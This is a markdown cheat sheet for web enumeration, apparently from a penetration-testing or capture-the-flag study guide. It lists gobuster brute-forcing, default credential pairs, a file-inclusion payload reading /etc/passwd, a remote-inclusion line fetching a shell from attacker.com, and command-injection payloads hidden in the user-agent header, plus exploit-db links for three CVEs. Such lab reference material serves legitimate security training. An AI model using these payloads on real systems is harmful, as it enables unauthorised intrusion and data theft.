## 🌐 Web Enumeration (Machines 51–60)

```bash
# Common Directories
curl -I http://<IP>/admin.php             # Admin panel detection
curl -I http://<IP>/config.php            # Config file exposure
curl -I http://<IP>/backup                # Backup file/folder

# Directory Bruteforce
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

# Default Credentials
admin:admin
admin:password
test:test

# Sensitive Directories
curl -I http://<IP>/.git/                 # Git repo exposure
curl -I http://<IP>/uploads               # Uploads folder

# Local File Inclusion (LFI)
curl "http://<IP>/vuln.php?page=../../../../etc/passwd"

# Remote File Inclusion (RFI)
curl "http://<IP>/vuln.php?page=http://attacker.com/shell.txt"

# Command Injection
curl "http://<IP>/cmd.php?input=ls" --user-agent="; ls"
curl "http://<IP>/cmd.php?input=id" --user-agent="| id"
```

---

### 📋 CVE Reference Table

| Software         | CVE ID         | Vulnerability                        | Exploit Link                         |
|------------------|----------------|--------------------------------------|--------------------------------------|
| CMS Made Simple  | CVE-2019-9053  | SQL Injection                        | https://www.exploit-db.com/exploits/46635 |
| CuteNews         | CVE-2019-11447 | Arbitrary File Upload                | https://www.exploit-db.com/exploits/46676 |
| PHP-Fusion       | CVE-2021-27803 | Authenticated RCE via image upload   | https://www.exploit-db.com/exploits/49883 |